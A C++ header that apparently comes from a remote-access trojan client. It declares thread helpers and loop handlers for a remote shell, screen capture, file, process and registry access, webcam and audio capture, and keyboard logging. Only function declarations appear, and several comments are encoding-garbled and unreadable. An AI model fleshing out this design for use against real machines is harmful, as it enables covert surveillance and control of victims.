#pragma once
#include "StdAfx.h"
#include "IOCPClient.h"
#include "common/commands.h"

typedef struct _THREAD_ARG_LIST
{
	DWORD (WINAPI *StartAddress)(LPVOID lParameter);  
	LPVOID  lParam;
	bool	bInteractive; // �Ƿ�֧�ֽ�������  ??
	HANDLE	hEvent;
}THREAD_ARG_LIST, *LPTHREAD_ARG_LIST;

typedef struct UserParam
{
	BYTE* buffer;
	int length;
	~UserParam() { SAFE_DELETE_ARRAY(buffer); }
}UserParam;

HANDLE _CreateThread (LPSECURITY_ATTRIBUTES  SecurityAttributes,   //��ȫ����
					  SIZE_T dwStackSize,                         //�߳�ջ�Ĵ�С  0                     
					  LPTHREAD_START_ROUTINE StartAddress,      //�̺߳����ص���� MyMain
					  LPVOID lParam,                         //char* strHost  IP                 
					  DWORD  dwCreationFlags,                      //0  4
					  LPDWORD ThreadId, bool bInteractive=FALSE);  

DWORD WINAPI ThreadProc(LPVOID lParam);

DWORD WINAPI LoopShellManager(LPVOID lParam);
DWORD WINAPI LoopScreenManager(LPVOID lParam);
DWORD WINAPI LoopFileManager(LPVOID lParam);
DWORD WINAPI LoopTalkManager(LPVOID lParam);
DWORD WINAPI LoopProcessManager(LPVOID lParam);
DWORD WINAPI LoopWindowManager(LPVOID lParam);
DWORD WINAPI LoopVideoManager(LPVOID lParam);
DWORD WINAPI LoopAudioManager(LPVOID lParam);
DWORD WINAPI LoopRegisterManager(LPVOID lParam);
DWORD WINAPI LoopServicesManager(LPVOID lParam);
DWORD WINAPI LoopKeyboardManager(LPVOID lParam);
